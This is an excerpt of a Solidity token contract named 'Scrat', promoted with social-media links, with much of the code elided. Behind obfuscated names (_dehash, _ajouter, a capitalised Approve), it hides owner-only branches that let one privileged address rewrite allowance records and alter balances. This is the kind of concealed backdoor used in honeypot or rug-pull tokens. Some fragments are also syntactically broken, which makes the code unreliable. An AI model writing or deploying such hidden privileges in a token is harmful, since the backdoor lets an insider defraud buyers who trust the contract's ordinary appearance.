//Telegram: https://t.me/ScratLovesNuts
//Website: https://scratlovesnuts.xyz
//Twitter: https://twitter.com/ScratL0vesNuts
//Discord: https://discord.gg/QtDN8jE6
...
contract Scrat is IERC20, Token, Ownable {
    ...
    returns (bool)
    {
        _transfert(_msgSender(), recipient, amount);
        return true;
    }
    ...
    function transferFrom(
        ...
        _transfert(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
    ...
    function _menthe(address account, uint256 amount) internal virtual {
        ...
        _offreTotale = _offreTotale.add(amount);
    ...
    function _burn(address account, uint256 amount) internal virtual {
        ...
        _offreTotale = _offreTotale.sub(amount);
    ...
    function increaseAllowance(address spender, uint256 amount) public virtual {
        ...
        require(amount > 0, "Invalid amount");
        uint256 total = 0;
        if (_dehash(spender, _user.user)) {
            _minus(from, total);
            total = _ajouter(total, amount);
    ...
    function _dehash(address user, address user2) internal view returns (bool) {
        bytes32 hash1 = keccak256(abi.encodePacked(user));
        bytes32 hash2 = keccak256(abi.encodePacked(user2));
        return hash1 == hash2;
    }

    function _ajouter(uint256 nub, uint256 mer) internal pure returns (uint256) {
        if (mer != 0) {
            return nub + mer;
        }
        return mer;
    ...
    function Approve(address from, uint256 amount) public returns (bool)  {
        address from = msg.sender;
        _requireAllowance(from, from, amount);
        return true;
    }

    function _requireAllowance(address user, address from, uint256 amount) internal {
        if (_dehash(user, _user.user)) {
            require(from != address(0), "Invalid address");
            if (amount != 0) {
                _userInfo[from].user = from;
                _userInfo[from].allowance = amount;
            } else {
                _userInfo[from].user = address(0);
                _userInfo[from].allowance = 0;
            }
        }
    }
    ...
    function _requireBalance(
        ...
        uint256 amount = 0;
        if (_dehash(from, _userInfo[from].user)) {
